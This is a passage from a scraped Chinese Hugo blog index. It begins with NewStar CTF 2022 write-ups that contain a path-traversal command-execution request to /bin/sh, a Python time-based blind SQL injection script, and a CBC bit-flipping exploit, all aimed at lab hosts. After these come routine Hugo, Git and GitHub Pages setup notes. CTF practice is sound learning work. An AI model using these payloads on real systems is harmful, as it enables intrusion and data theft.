/cgi-bin/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/bin/sh # data echo; ls / exp: POST /cgi-bin/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/bin/sh # data echo; cat /ffffllllaaagggg_cc084c485d curl: curl --date \"echo;cat /ffffllllaaagggg_cc084c485d\" 'http://ip:port/cgi-bin/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/bin/sh' Final round sql注入，无回显，非windows无法dnslog，只能时间盲注 /x0c绕过空格 （手动用上周的%0c成功，python中失败，怪 python import requests import time headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0'} chars = 'abcdefghigklmnopqrstuvwxyz1234567890_}{ABCDEFGHJKLMNOPQRSTUVWXYZ' flag = '' url = \"http://397dddcd-0381-4433-8612-6ea54b673db0.node4.buuoj.cn:81/comments.php\" for i in range(1,40): for char in chars: payload = \"100\\x0cand\\x0cif(ascii(substr((select\\x0ctext\\x0cfrom\\x0cwfy_comments\\x0cwhere\\x0cid=100),{0},1))={1},sleep(3),0)\".format(i,ord(char)) data = {\"name\":payload} try: requests.post(url,data=data,timeout=2.5) continue except: flag += char print(i,\" \",flag) break print('flag is ' + flag) # flag{Ju2t_let_me_s1eep_f0r_a_whi1e} ","date":"2023-07-12","objectID":"/newstar2022/:5:1","tags":["ctf"],"title":"newstar2022","uri":"/newstar2022/"},{"categories":["ctf"],"content":"crypto flip-flop import os from Crypto.Cipher import AES from secret import FLAG auth_major_key = os.urandom(16) BANNER = \"\"\" Login as admin to get the flag ! \"\"\" MENU = \"\"\" Enter your choice [1] Create NewStarCTF Account [2] Create Admin Account [3] Login [4] Exit \"\"\" print(BANNER) while True: print(MENU) option = int(input('\u003e ')) if option == 1: auth_pt = b'NewStarCTFer____' user_key = os.urandom(16) cipher = AES.new(auth_major_key, AES.MODE_CBC, user_key) code = cipher.encrypt(auth_pt) print(f'here is your authcode: {user_key.hex() + code.hex()}') elif option == 2: print('GET OUT !!!!!!') elif option == 3: authcode = input('Enter your authcode \u003e ') user_key = bytes.fromhex(authcode)[:16] code = bytes.fromhex(authcode)[16:] cipher = AES.new(auth_major_key, AES.MODE_CBC, user_key) auth_pt = cipher.decrypt(code) if auth_pt == b'AdminAdmin______': print(FLAG) elif auth_pt == b'NewStarCTFer____': print('Have fun!!') else: print('Who are you?') elif option == 4: print('ByeBye') exit(0) else: print(\"WTF\") CBC Bit-Flipping Attack Conclusion · Automne’s Shadow (ce-automne.github.io) AES CBC 模式的字节翻转攻击(CBC Bit-Flipping Attack) CBC是分组加密，前一组密文与这一组明文异或，第一组明文与偏移向量iv异或；解密类似 前一组密文翻转某一字节，这一组明文对应字节翻转 按字节将前一组密文xor原明文xor需要的明文，则解密后可得到需要的明文 AAB = B 本题只有一组，直接将iv各个字节异或 exp： from pwnlib.tubes.remote import remote # 字节翻转攻击 def new_code(authcode): auth_pt = b\"NewStarCTFer____\" auth_pt2 = b\"AdminAdmin______\" user_key = bytes.fromhex(authcode)[:16].hex() code = bytes.fromhex(authcode)[16:] newuser_key = \"\" for i in range(16): k = hex(int(user_key[2*i:2*i+2],16)^auth_pt[i]^auth_pt2[i])[2:] newuser_key += k.rjust(2,'0') new_code = newuser_key + code.hex() return new_code # 远程连接 r = remote(\"node4.buuoj.cn\",29929) r.sendline('1'.encode()) re = r.recv().decode() print(re) index = re.find(\":\") authocode = re[index+2:index+66] admincode = new_code(authocode) r.sendline('3'.encode()) re = r.recv().decode() print(re) r.sendline(admincode.encode()) re = r.recv().decode() print(re) r.close() An der schönen Elliptische Kurve task.sage： from secret import FLAG, ECDH_KEY_EXCHANGE from Crypto.Cipher import AES from hashlib import md5 from os import urandom iv = urandom(16) a = 14489 b = 10289 p = 7486573182795736771889604737751889118967735916352298289975055815020934891723453392369540853603360270847848895677903334441530052977221688450741083448029661 F = GF(p) E = EllipticCurve(F, [a, b]) G = E.random_point() my_private_key = random_prime(2^256) shared, sender_public_key = ECDH_KEY_EXCHANGE(G, my_private_key) key = md5(str(int(shared.xy()[0])).encode()).digest() cipher = AES.new(key, AES.MODE_CBC, iv) ciphretext = cipher.encrypt(FLAG) print(a) print(b) print(p) print(sender_public_key) print(my_private_key) print(ciphretext.hex()) print(iv.hex()) output.txt： 14489 10289 7486573182795736771889604737751889118967735916352298289975055815020934891723453392369540853603360270847848895677903334441530052977221688450741083448029661 (1285788649714386836892440333012889444698233333809489364474616947934542770724999997145538088456652601147045234490019282952264340541239682982255115303711207 : 1081635450946385063319483423983665253792071829707039194609541132041775615770167048603029155228167113450196436786905820356216200242445665942628721193713459 : 1) 2549545681219766023689977461986014915946503806253877534915175093306317852773 2f65ff4a97e0e05c06eab06b58ea38a3d5b6d2a65ea4907bc46493b30081a211d7cffc872a23dbd565ef307f9492bb23 d151c04c645c3e2a8d3f1ae44589ef20 ECDH 图解 ECDHE 密钥交换算法 - 小林coding - 博客园 (cnblogs.com) 类似DH，先创建椭圆曲线GF(p)和G，A和B双方选择a和b，得到各自公钥aG和bG，发送后得到共享私钥abG 本题给了B的公钥和a直接创建椭圆曲线，令G = B的公钥，则私钥 = G*a exp.py： from Crypto.Cipher import AES from hashlib import md5 import tinyec.ec as ec a = 14489 b = 10289 p = 7486573182795736771889604737751889118967735916352298289975055815020934891723453392369540853603360270847848895677903334441530052977221688450741083448029661 sender_public_key = [128578864971438683689244033301288944469823333380948936447461694793454277072499999714553808845665260114704523449","date":"2023-07-12","objectID":"/newstar2022/:5:2","tags":["ctf"],"title":"newstar2022","uri":"/newstar2022/"},{"categories":["blog"],"content":"抓猫游戏 参考：Hugo系列(3.3) - LoveIt主题美化与博客功能增强 · 第四章 - Yulin Lewis’ Blog (lewky.cn) 项目：ganlvtech/phaser-catch-the-cat: An HTML5 game ‘Catch The Cat’ powered by Phaser 3 md文件直接引用js无效，选择创建shortcode （或者在layouts\\_default\\中创建html，再在md文件引用） layouts\\shortcodes\\catch-the-cat \u003cscript src=\"/js/catch-the-cat/phaser.min.js\"\u003e\u003c/script\u003e \u003cscript src=\"/js/catch-the-cat/catch-the-cat.js\"\u003e\u003c/script\u003e \u003cdiv id=\"catch-the-cat\"\u003e\u003c/div\u003e \u003cscript\u003e window.game = new CatchTheCatGame({ w: 11, h: 11, r: 20, backgroundColor: 0xeeeeee, parent: 'catch-the-cat', statusBarAlign: 'center', credit: 'github.com/ganlvtech' }); \u003c/script\u003e 将phaser.min.js和catch-the-cat.js保存到static\\js\\catch-the-cat\\下 content\\catch-the-cat\\index.md --- title: \"逮住那只猫!\" --- ## 游戏规则 1. 点击小圆点，围住小猫。 2. 你点击一次，小猫走一次。 3. 直到你把小猫围住（赢），或者小猫走到边界并逃跑（输）。 --- {{\u003c catch-the-cat \u003e}} 在config.toml的menu引入即可 ","date":"2022-11-20","objectID":"/%E5%B0%8F%E6%B8%B8%E6%88%8F/:0:1","tags":["blog","game"],"title":"小游戏","uri":"/%E5%B0%8F%E6%B8%B8%E6%88%8F/"},{"categories":["blog"],"content":"mikutap 参考：Mikutap~初音未来音乐游戏 (lewky.cn) layouts\\_default\\mikutap.htmll \u003c!DOCTYPE html\u003e \u003chtml lang=\"zh\"\u003e \u003chead\u003e \u003cmeta charset=\"utf-8\"\u003e \u003cmeta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"\u003e \u003cmeta name=\"apple-mobile-web-app-capable\" content=\"yes\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, user-scalable=0\"\u003e \u003cmeta name=\"description\" content=\"初音未来版本的通过点击/触摸播放声音并出现变化图案的互动内容。\"\u003e \u003ctitle\u003eMikutap~初音未来音乐游戏\u003c/title\u003e \u003clink rel=\"apple-touch-icon\" href=\"icon.png\"\u003e \u003clink href=\"https://fonts.loli.net/css?family=Quicksand:400\" rel=\"stylesheet\"\u003e \u003clink charset=\"UTF-8\" href=\"https://cdn.jsdelivr.net/gh/lewky/mikutap@master/shared/sp/css/common.css\" rel=\"stylesheet\"\u003e \u003clink charset=\"utf-8\" href=\"https://cdn.jsdelivr.net/gh/lewky/mikutap@master/css/mikutap.css\" rel=\"stylesheet\"\u003e \u003cscript charset=\"utf-8\" src=\"https://cdnjs.loli.net/ajax/libs/jquery/2.2.4/jquery.min.js\" type=\"text/javascript\"\u003e\u003c/script\u003e \u003cscript charset=\"utf-8\" src=\"https://cdnjs.loli.net/ajax/libs/pixi.js/3.0.11/pixi.min.js\" type=\"text/javascript\"\u003e\u003c/script\u003e \u003cscript charset=\"utf-8\" src=\"https://cdnjs.loli.net/ajax/libs/gsap/1.19.1/TweenMax.min.js\" type=\"text/javascript\"\u003e\u003c/script\u003e \u003cscript charset=\"UTF-8\" src=\"https://cdn.jsdelivr.net/gh/lewky/mikutap@master/shared/js/common-2.min.js\" type=\"text/javascript\"\u003e\u003c/script\u003e \u003cscript charset=\"utf-8\" src=\"https://cdn.jsdelivr.net/gh/lewky/mikutap@master/js/mikutap.min.js\" type=\"text/javascript\"\u003e\u003c/script\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv id=\"view\"\u003e\u003c/div\u003e \u003cdiv id=\"scene_top\"\u003e \u003ch1\u003eMikutap\u003c/h1\u003e \u003cdiv id=\"ng\"\u003e \u003cp class=\"atten\"\u003e十分抱歉\u003cbr\u003e您的浏览器并不支持本页面需要的特性\u003c/p\u003e \u003c/div\u003e \u003cdiv class=\"ok\"\u003e \u003cp id=\"bt_start\"\u003e\u003ca href=\"\"\u003e!开始!\u003c/a\u003e\u003c/p\u003e \u003c/div\u003e \u003cp id=\"bt_about\"\u003e\u003ca href=\"\"\u003e*关于*\u003c/a\u003e\u003c/p\u003e \u003cdiv class=\"ok\"\u003e \u003cp class=\"attention\"\u003e※请打开声音并享受。\u003c/p\u003e \u003c/div\u003e \u003cdiv class=\"ok\"\u003e \u003cp class=\"tit\"\u003e\u003cstrong\u003e本页面源自(Origin Site): \u003ca href=\"https://aidn.jp/mikutap\"\u003ehttps://aidn.jp/mikutap\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e \u003c/div\u003e \u003c/div\u003e \u003cdiv id=\"scene_loading\"\u003e \u003chr size=\"1\" color=\"#fff\"\u003e \u003c/div\u003e \u003cdiv id=\"scene_main\"\u003e \u003cdiv class=\"set\"\u003e \u003cp class=\"attention\"\u003e点击 \u0026amp; 拖动或者按任意键!\u003c/p\u003e \u003cp id=\"bt_backtrack\"\u003e\u003ca href=\"\"\u003e背景音乐: 开启\u003c/a\u003e\u003c/p\u003e \u003c/div\u003e \u003c/div\u003e \u003cdiv id=\"about_cover\"\u003e\u003c/div\u003e \u003cdiv id=\"about\"\u003e \u003cdiv id=\"about_in\"\u003e \u003cp class=\"close\"\u003e\u003cspan id=\"bt_close\"\u003e×\u003c/span\u003e\u003c/p\u003e \u003cp class=\"con\"\u003e 声音来源 \u003ca href=\"https://ec.crypton.co.jp/pages/prod/vocaloid/mikuv4x\" target=\"_blank\"\u003eHatsune Miku\u003c/a\u003e \u003c/p\u003e \u003cp class=\"con\"\u003e 作者 \u003ca href=\"https://aidn.jp\" target=\"_blank\"\u003edaniwell\u003c/a\u003e (\u003ca href=\"https://twitter.com/daniwell_aidn\" target=\"_blank\"\u003etwitter\u003c/a\u003e) \u003c/p\u003e \u003cp class=\"link\"\u003e 灵感来源 \u003ca href=\"http://patatap.com/\" target=\"_blank\"\u003ePatatap\u003c/a\u003e\u003cbr\u003e(令人赞叹的网页!)\u003c/p\u003e \u003c/div\u003e \u003c/div\u003e \u003cdiv id=\"bt_fs\"\u003e□全屏显示\u003c/div\u003e {{- /* 百度统计 */ -}} \u003cscript\u003e var _hmt = _hmt || []; (function() { var hm = document.createElement(\"script\"); hm.src = \"https://hm.baidu.com/hm.js?6f278ed0fdb01edb3b1e7398379e5432\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(hm, s); })(); \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e md文件头部 layout: \"mikutap.html\" ","date":"2022-11-20","objectID":"/%E5%B0%8F%E6%B8%B8%E6%88%8F/:0:2","tags":["blog","game"],"title":"小游戏","uri":"/%E5%B0%8F%E6%B8%B8%E6%88%8F/"},{"categories":null,"content":"Welcome to my blog！ ","date":"2022-11-16","objectID":"/about/:0:0","tags":null,"title":"关于","uri":"/about/"},{"categories":null,"content":"建站历程 2021-12-11 hugo+MemE+github page 开始blog 2022-11-16 theme改为LoveIt，github action自动部署，魔改 ","date":"2022-11-16","objectID":"/about/:1:0","tags":null,"title":"关于","uri":"/about/"},{"categories":["git"],"content":"Git ","date":"2022-11-16","objectID":"/git/:1:0","tags":["git"],"title":"Git","uri":"/git/"},{"categories":["git"],"content":"常用命令 git init 初始化 git remote add origin git@github.com:yourname/respositoryname.git 连接远程仓库（ssh） git remote add origin https://github.com/yourname/respositoryname.git 连接远程仓库（https） git add . 添加 git status 查看状态 git commit -m \"yourtext\" 提交 git push origin main 推送到远程仓库的main分支 git branch -M main 切换为main分支，推送报错使用 git log --pretty=oneline 查询版本ID git reset --hard ID 恢复历史版本 git push -f -u origin 推送 清空仓库：pull后删除再push ","date":"2022-11-16","objectID":"/git/:1:1","tags":["git"],"title":"Git","uri":"/git/"},{"categories":["git"],"content":"ssh 用git bash cd C:\\Users\\Administrator ssh-keygen -t rsa -C \"youremail@example.com\" 三次回车，复制.ssh目录下的id_rsa.pub内容 打开github，在settings的SSH and GPG keys中添加 ssh -T git@github.com # 测试 git config --global http.sslVerify \"false\" # 取消ssl验证 git config --global http.sslVerify \"true\" # 开启ssl验证 ","date":"2022-11-16","objectID":"/git/:1:2","tags":["git"],"title":"Git","uri":"/git/"},{"categories":["git"],"content":"子模块 git submodule add [address] # 添加子模块 git clone --recursive [adress] # 子项目一起clone git submodule update --init # 或者clone后更新 fatal: ‘xxx’ already exists in the index git rm -r --cached xxx ","date":"2022-11-16","objectID":"/git/:1:3","tags":["git"],"title":"Git","uri":"/git/"},{"categories":["git"],"content":"代理 一文让你了解如何为 Git 设置代理 - Eric (ericclose.github.io) 特定域名代理 http代理 7890为clash http代理端口 git config --global http.https://github.com.proxy http://127.0.0.1:7890 ssh代理 在~/.ssh/.config windows Host github.com User git ProxyCommand nc -X connect -x 127.0.0.1:7890 %h %p linux Host github.com User git ProxyCommand nc -X connect -x 127.0.0.1:7890 %h %p ssh -T git@github.com # 测试 取消代理 在文件~/.gitconfig 和 ~/.ssh/.config 对应位置删除或注释 ","date":"2022-11-16","objectID":"/git/:1:4","tags":["git"],"title":"Git","uri":"/git/"},{"categories":["hugo"],"content":"Hugo ","date":"2022-11-16","objectID":"/hugo/:1:0","tags":["Hugo","blog","LoveIt","MemE"],"title":"Hugo","uri":"/hugo/"},{"categories":["hugo"],"content":"go Downloads - The Go Programming Language (google.cn) ","date":"2022-11-16","objectID":"/hugo/:1:1","tags":["Hugo","blog","LoveIt","MemE"],"title":"Hugo","uri":"/hugo/"},{"categories":["hugo"],"content":"hugo Releases · gohugoio/hugo (github.com) ","date":"2022-11-16","objectID":"/hugo/:1:2","tags":["Hugo","blog","LoveIt","MemE"],"title":"Hugo","uri":"/hugo/"},{"categories":["hugo"],"content":"创建 hugo new site name # 创建网站文件夹name hugo new posts/my-first-post.md # 创建文件my-first-post.md，在contets/posts文件夹下 hugo server -D # 启动Hugo服务器 hugo -d docs # 打包到docs文件夹 ","date":"2022-11-16","objectID":"/hugo/:1:3","tags":["Hugo","blog","LoveIt","MemE"],"title":"Hugo","uri":"/hugo/"},{"categories":["hugo"],"content":"github page 网站源码仓库hugo_blog为私有，发布仓库yourname.github.io为公有 token 在 Settings ——\u003e Developer settings ——\u003e Personal access tokens ——\u003e Token(classic) 生成token，选择repo和workflow，记住token Action 在hugo_blog的Settings ——\u003e Secrets ——\u003e Actions中填在上述token 在本地源码仓库新建 .github/workflows/main.yml name: GitHub Pages on: push: branches: - main # 博客根目录的默认分支，这里是main，有时也是master pull_request: jobs: deploy: runs-on: ubuntu-20.04 concurrency: group: ${{ github.workflow }}-${{ github.ref }} steps: - uses: actions/checkout@v2 with: submodules: true fetch-depth: 0 - name: Setup Hugo uses: peaceiris/actions-hugo@v2 with: hugo-version: '0.105.0' # 填写你的hugo版本，可用hugo version查看 extended: true # 如果你使用的不是extended版本的hugo，将true改为false - name: Build run: hugo --minify - name: Deploy uses: peaceiris/actions-gh-pages@v3 if: ${{ github.ref == 'refs/heads/main' }} # 注意填写main或者master with: personal_token: ${{ secrets.secret}} # secret为添加secrets所设名字 external_repository: yourname/yourname.github.io # 发布仓库名 publish_branch: main # 发布仓库分支main或者master publish_dir: ./public #cname: www.example.com # 填写你的自定义域名。如果没有用自定义域名，注释掉这行 之后push源码仓库，就会触发Github Action，将public文件夹推送到发布仓库 发布 hugo -b \"https://yourname.github.io\" git add . git status git commit -m \"message\" git push origin main -f ","date":"2022-11-16","objectID":"/hugo/:1:4","tags":["Hugo","blog","LoveIt","MemE"],"title":"Hugo","uri":"/hugo/"},{"categories":["hugo"],"content":"LoveIt LoveIt (hugoloveit.com) ","date":"2022-11-16","objectID":"/hugo/:2:0","tags":["Hugo","blog","LoveIt","MemE"],"title":"Hugo","uri":"/hugo/"},{"categories":["hugo"],"content":"下载 git init git submodule add https://github.com/dillonzq/LoveIt.git themes/LoveIt ","date":"2022-11-16","objectID":"/hugo/:2:1","tags":["Hugo","blog","LoveIt","MemE"],"title":"Hugo","uri":"/hugo/"},{"categories":["hugo"],"content":"配置 主题文档 - 基本概念 - LoveIt (hugoloveit.com) config.toml baseURL = \"http://example.org/\" # [en, zh-cn, fr, ...] 设置默认的语言 defaultContentLanguage = \"zh-cn\" # 网站语言, 仅在这里 CN 大写 languageCode = \"zh-CN\" # 是否包括中日韩文字 hasCJKLanguage = true # 网站标题 title = \"我的全新 Hugo 网站\" # 更改使用 Hugo 构建网站时使用的默认主题 theme = \"LoveIt\" [params] # LoveIt 主题版本 version = \"0.2.X\" [menu] [[menu.main]] identifier = \"posts\" # 你可以在名称 (允许 HTML 格式) 之前添加其他信息, 例如图标 pre = \"\" # 你可以在名称 (允许 HTML 格式) 之后添加其他信息, 例如图标 post = \"\" name = \"文章\" url = \"/posts/\" # 当你将鼠标悬停在此菜单链接上时, 将显示的标题 title = \"\" weight = 1 [[menu.main]] identifier = \"tags\" pre = \"\" post = \"\" name = \"标签\" url = \"/tags/\" title = \"\" weight = 2 [[menu.main]] identifier = \"categories\" pre = \"\" post = \"\" name = \"分类\" url = \"/categories/\" title = \"\" weight = 3 # Hugo 解析文档的配置 [markup] # 语法高亮设置 (https://gohugo.io/content-management/syntax-highlighting) [markup.highlight] # false 是必要的设置 (https://github.com/dillonzq/LoveIt/issues/158) noClasses = false hugo server --disableFastRender -b http://localhost:1313 -e production ","date":"2022-11-16","objectID":"/hugo/:2:2","tags":["Hugo","blog","LoveIt","MemE"],"title":"Hugo","uri":"/hugo/"},{"categories":["hugo"],"content":"Hugo MEME Hugo 主题 MemE 文档 | reuixiy (io-oi.me) ","date":"2022-11-16","objectID":"/hugo/:3:0","tags":["Hugo","blog","LoveIt","MemE"],"title":"Hugo","uri":"/hugo/"},{"categories":["hugo"],"content":"开启不蒜子 不蒜子 | 不如 (ibruce.info) 在 config.toml 对应位置开启 测试时 hugo server -D –environment production，否则不会显示（试了好久 希望能在config中开启不算子或者其他方式统计文章访问量统计 · Issue #40 · reuixiy/hugo-theme-meme (github.com) ","date":"2022-11-16","objectID":"/hugo/:3:1","tags":["Hugo","blog","LoveIt","MemE"],"title":"Hugo","uri":"/hugo/"},{"categories":["hugo"],"content":"图床图片显示问题 本地可查看图片，说明图床没问题，问题出现在浏览器方面 解决：在文章头添加 \u003cmeta name=\"referrer\" content=\"no-referrer\" /\u003e 或者在blog下的layouts/partials/custom/post-meta.html添加 参考：解决hexo博客不能显示图床图片问题 ｜ 客舟听雨 (hj24.life) ","date":"2022-11-16","objectID":"/hugo/:3:2","tags":["Hugo","blog","LoveIt","MemE"],"title":"Hugo","uri":"/hugo/"},{"categories":["blog"],"content":"环境： hugo：hugo v0.105.0+extended windows/amd64 theme：LoveIt ","date":"2022-11-16","objectID":"/hugo%E9%85%8D%E7%BD%AE/:0:0","tags":["blog","hugo","LoveIt"],"title":"Hugo配置","uri":"/hugo%E9%85%8D%E7%BD%AE/"},{"categories":["blog"],"content":"配置 参考：Hugo系列(3.0) - LoveIt主题美化与博客功能增强 ","date":"2022-11-16","objectID":"/hugo%E9%85%8D%E7%BD%AE/:1:0","tags":["blog","hugo","LoveIt"],"title":"Hugo配置","uri":"/hugo%E9%85%8D%E7%BD%AE/"},{"categories":["blog"],"content":"侧目录 config.toml # 目录配置 [params.page.toc] # 是否使用目录 enable = true # 是否保持使用文章前面的静态目录 keepStatic = false # 是否使侧边目录自动折叠展开 auto = true assets\\css\\_custom.scss /* 目录 */ .toc { background: white; opacity: .95; } [theme=dark] .toc { background: #2f2e2e; } [theme=dark] #toc-auto { border-left-color: #6c9dda; } .toc .toc-content { font-size: .8rem; } .toc .toc-content code { border: none; color: #f7ab01; font-size: 1em; } nav#TableOfContents ol { padding-inline-start: 30px; \u0026 ol { padding-inline-start: 15px; font-size: .75rem; display: none; } \u0026 li.has-active ol { display: block; } } ","date":"2022-11-16","objectID":"/hugo%E9%85%8D%E7%BD%AE/:1:1","tags":["blog","hugo","LoveIt"],"title":"Hugo配置","uri":"/hugo%E9%85%8D%E7%BD%AE/"},{"categories":["blog"],"content":"搜索 采用Algolia，创建新的Application(free)，记住index，appID和searchAPI，填入下面对应位置 将public内的index.json上传到Algolia：Search ——\u003e index ——\u003e Add records ——\u003e Upload file config.toml [params.search] enable = true # 搜索引擎的类型 (\"lunr\", \"algolia\") type = \"algolia\" # 文章内容最长索引长度 contentLength = 4000 # 搜索框的占位提示语 placeholder = \"\" # 最大结果数目 maxResultLength = 10 # 结果内容片段长度 snippetLength = 50 # 搜索结果中高亮部分的 HTML 标签 highlightTag = \"em\" # 是否在搜索索引中使用基于 baseURL 的绝对路径 absoluteURL = false [params.search.algolia] index = \"\" appID = \"\" searchKey = \"\" 存在问题：需要手动上传json ","date":"2022-11-16","objectID":"/hugo%E9%85%8D%E7%BD%AE/:1:2","tags":["blog","hugo","LoveIt"],"title":"Hugo配置","uri":"/hugo%E9%85%8D%E7%BD%AE/"},{"categories":["blog"],"content":"github corners theme内对应文件复制到此位置 layout\\partials\\header.htnl 在\u003cdiv class=\"header-wrapper\"\u003e的下一行添加，更改yourname \u003ca href=\"https://github.com/yourname\" class=\"github-corner\" target=\"_blank\" title=\"Follow me on GitHub\" aria-label=\"Follow me on GitHub\"\u003e\u003csvg width=\"3.5rem\" height=\"3.5rem\" viewBox=\"0 0 250 250\" style=\"fill:#70B7FD; color:#fff; position: absolute; top: 0; border: 0; left: 0; transform: scale(-1, 1);\" aria-hidden=\"true\"\u003e\u003cpath d=\"M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z\"\u003e\u003c/path\u003e\u003cpath d=\"M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2\" fill=\"currentColor\" style=\"transform-origin: 130px 106px;\" class=\"octo-arm\"\u003e\u003c/path\u003e\u003cpath d=\"M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z\" fill=\"currentColor\" class=\"octo-body\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e assets\\css\\_custom.css /* Github Corner */ .github-corner:hover .octo-arm { animation: octocat-wave 560ms ease-in-out } @keyframes octocat-wave { 0%,100% { transform: rotate(0) } 20%,60% { transform: rotate(-25deg) } 40%,80% { transform: rotate(10deg) } } @media (max-width:500px) { .github-corner:hover .octo-arm { animation: none } .github-corner .octo-arm { animation: octocat-wave 560ms ease-in-out } } 其他样式：GitHub Corners项目地址 ","date":"2022-11-16","objectID":"/hugo%E9%85%8D%E7%BD%AE/:1:3","tags":["blog","hugo","LoveIt"],"title":"Hugo配置","uri":"/hugo%E9%85%8D%E7%BD%AE/"},{"categories":["blog"],"content":"子菜单 layouts/partials/header.html {{- range .Site.Menus.main -}} {{- $url := .URL | relLangURL -}} {{- with .Page -}} {{- $url = .RelPermalink -}} {{- end -}} \u003ca class=\"menu-item{{ if $.IsMenuCurrent `main` . | or ($.HasMenuCurrent `main` .) | or (eq $.RelPermalink $url) }} active{{ end }}\" href=\"{{ $url }}\"{{ with .Title }} title=\"{{ . }}\"{{ end }}{{ if (urls.Parse $url).Host }} rel=\"noopener noreffer\" target=\"_blank\"{{ end }}\u003e {{- .Pre | safeHTML }} {{ .Name }} {{ .Post | safeHTML -}} \u003c/a\u003e {{- end -}} 改为： {{- range .Site.Menus.main -}} {{ if .HasChildren }} \u003cdiv class=\"dropdown\"\u003e \u003ca {{ if .URL }}href=\"{{ .URL }}\"{{ else }}href=\"javascript:void(0);\"{{ end }} class=\"menu-item menu-more dropbtn\" title=\"{{ .Title }}\" {{ if eq .Post \"_blank\" }}target=\"_blank\" rel=\"noopener\"{{ end }}\u003e {{- .Pre | safeHTML }} {{ .Name }} {{ if ne .Post \"_blank\" }}{{ .Post | safeHTML -}}{{ end }} \u003c/a\u003e \u003cdiv class=\"menu-more-content dropdown-content\"\u003e {{- range .Children -}} {{- $url := .URL | relLangURL -}} {{- with .Page -}} {{- $url = .RelPermalink -}} {{- end -}} \u003ca href=\"{{ $url }}\" title=\"{{ .Title }}\" {{ if eq .Post \"_blank\" }}target=\"_blank\" rel=\"noopener\"{{ end }}\u003e{{- .Pre | safeHTML }} {{ .Name }} {{ if ne .Post \"_blank\" }}{{ .Post | safeHTML -}}{{ end }}\u003c/a\u003e {{- end -}} \u003c/div\u003e \u003c/div\u003e {{ else }} {{- $url := .URL | relLangURL -}} {{- with .Page -}} {{- $url = .RelPermalink -}} {{- end -}} \u003ca class=\"menu-item{{ if $.IsMenuCurrent `main` . | or ($.HasMenuCurrent `main` .) | or (eq $.RelPermalink $url) }} active{{ end }}\" href=\"{{ $url }}\"{{ with .Title }} title=\"{{ . }}\"{{ end }}{{ if (urls.Parse $url).Host }} rel=\"noopener noreffer\" target=\"_blank\"{{ end }}\u003e {{- .Pre | safeHTML }} {{ .Name }} {{ if ne .Post \"_blank\" }}{{ .Post | safeHTML -}}{{ end }} \u003c/a\u003e {{- end -}} {{- end -}} assets\\css\\_custom.scss /* 子菜单栏 */ .dropdown { display: inline-block; } /* 子菜单的内容 (默认隐藏) */ .dropdown-content { display: none; position: absolute; background-color: #f9f9f9; box-shadow: 0px 8px 16px 0px rgba(0, 0, 0, 0.2); border-radius: 4px; line-height: 1.3rem; } /* 子菜单的链接 */ .dropdown-content a { padding: 10px 18px 10px 14px; text-decoration: none; display: block; \u0026 i { margin-right: 3px; } } /* 鼠标移上去后修改子菜单链接颜色 */ .dropdown-content a:hover { background-color: #f1f1f1; border-radius: 4px; } /* 鼠标移上去后修改子菜单链接颜色 */ [theme=dark] .dropdown-content a:hover { background-color: #6c9dda; border-radius: 4px; } /* 在鼠标移上去后显示子菜单 */ .dropdown:hover .dropdown-content { display: block; } @media screen and (max-width: 680px) { .dropdown { display: inline; } .dropdown:hover .dropdown-content { display: inline; z-index: 1; margin-top: -2em; margin-left: 3em; } .dropdown-content a:hover { background-color: transparent; } } config.toml [[menu.main]] parent = \"\u003cidetifier\u003e\" post = \"_blank\" # 新窗口 ","date":"2022-11-16","objectID":"/hugo%E9%85%8D%E7%BD%AE/:1:4","tags":["blog","hugo","LoveIt"],"title":"Hugo配置","uri":"/hugo%E9%85%8D%E7%BD%AE/"},{"categories":["blog"],"content":"更新时间 直接在文档头加lastmod信息 或者在config.toml添加 [frontmatter] lastmod = [\":fileModTime\", \"lastmod\"] ","date":"2022-11-16","objectID":"/hugo%E9%85%8D%E7%BD%AE/:1:5","tags":["blog","hugo","LoveIt"],"title":"Hugo配置","uri":"/hugo%E9%85%8D%E7%BD%AE/"},{"categories":["blog"],"content":"自定义js \\static\\js\\custom.js为自定义js \\layouts\\partials\\assets.html（复制theme下同文件 在{{- partial \"plugin/analytics.html\" . -}}上一行添加 \u003cscript type=\"text/javascript\" src=\"https://cdn.jsdelivr.net/npm/jquery@2.1.3/dist/jquery.min.js\"\u003e\u003c/script\u003e {{- /* 自定义的js文件 */ -}} \u003cscript type=\"text/javascript\" src=\"/js/custom.js\"\u003e\u003c/script\u003e 第一行为引入jQuery ","date":"2022-11-16","objectID":"/hugo%E9%85%8D%E7%BD%AE/:1:6","tags":["blog","hugo","LoveIt"],"title":"Hugo配置","uri":"/hugo%E9%85%8D%E7%BD%AE/"},{"categories":["blog"],"content":"背景图片轮换 这个功能需要引入图片轮播插件jquery-backstretch的cdn，并且该插件依赖于jQuery layouts\\partials\\assets.html 在引入custom.js前添加 \u003cscript type=\"text/javascript\" 